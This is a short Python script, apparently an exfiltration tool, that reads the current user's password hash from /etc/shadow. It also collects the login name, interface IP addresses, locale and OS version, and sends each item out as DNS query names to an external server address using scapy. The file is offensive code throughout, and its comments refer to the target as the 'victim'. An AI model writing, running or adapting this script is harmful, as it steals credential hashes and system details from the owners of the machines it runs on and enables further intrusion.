# importing os module
import os
import socket
import locale   
import subprocess
from scapy.all import DNS, DNSQR, IP, sr1, UDP

# a function that gets a string and sends it to the dns server 
def send_info(secret):
    dns_req = IP(dst= '94.140.15.15')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=secret))
    answer = sr1(dns_req, verbose=0)
    

# getting the password file from the victim
output = subprocess.check_output(f"cat /etc/shadow | grep {os.getlogin()}", shell=True).decode().split(':')
secret = output[1]
secret = f"Password: {secret}"
send_info(secret)

# getting the host name
secret = os.getlogin()
secret = f"Hostname: {secret}"
send_info(secret)

# getting the ip of the victim in all the interfaces he is in
ipv4 = os.popen('ip addr show').read().split("inet ")
for c in range (1 , len(ipv4)):
    secret = ipv4[c].split("/")[0]
    secret = f"IP: {secret}"
    send_info(secret)
    
    
# getting the available languages   
secret = locale.getlocale()
temp = ", ".join(secret)
secret = f"Language: {temp}"
send_info(secret)

# getting the OS version
secret = subprocess.check_output('lsb_release -a', shell=True).decode()
secret = f"OS Version: {secret}"
send_info(secret)

# cd /etc cat shadow





